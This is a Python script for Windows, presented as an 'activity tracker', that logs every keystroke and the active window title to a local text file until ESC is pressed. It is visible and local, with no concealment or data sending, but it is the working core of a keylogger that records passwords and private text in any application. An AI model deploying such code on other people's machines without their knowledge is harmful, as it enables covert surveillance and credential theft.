from pynput import keyboard
from datetime import datetime
import win32gui
import traceback

log_file = "activity_log.txt"
current_text = ""
current_window = ""

start_time = datetime.now()

print("Activity tracker started...")
print("Press ESC to stop and save log.\n")


def get_active_window():
    window = win32gui.GetForegroundWindow()
    return win32gui.GetWindowText(window)


def on_press(key):
    global current_text, current_window

    try:
        window = get_active_window()

        if window != current_window:
            current_window = window
            time_now = datetime.now().strftime("%H:%M:%S")

            with open(log_file, "a", encoding="utf-8") as f:
                f.write(f"\n\n[{time_now}] Active Window: {window}\n")

        try:
            current_text += key.char
            with open(log_file, "a", encoding="utf-8") as f:
                f.write(key.char)

        except:
            if key == keyboard.Key.space:
                with open(log_file, "a", encoding="utf-8") as f:
                    f.write(" ")

            elif key == keyboard.Key.enter:
                with open(log_file, "a", encoding="utf-8") as f:
                    f.write("\n")

            elif key == keyboard.Key.backspace:
                pass

    except Exception:
        with open("error_log.txt", "w") as f:
            f.write(traceback.format_exc())


def on_release(key):
    if key == keyboard.Key.esc:

        end_time = datetime.now()

        with open(log_file, "a", encoding="utf-8") as f:
            f.write("\n\n----------------------\n")
            f.write(f"Start Time: {start_time}\n")
            f.write(f"End Time: {end_time}\n")
            f.write("----------------------\n")

        print("Log saved in activity_log.txt")
        return False


try:
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

except Exception:
    with open("error_log.txt", "w") as f:
        f.write(traceback.format_exc())
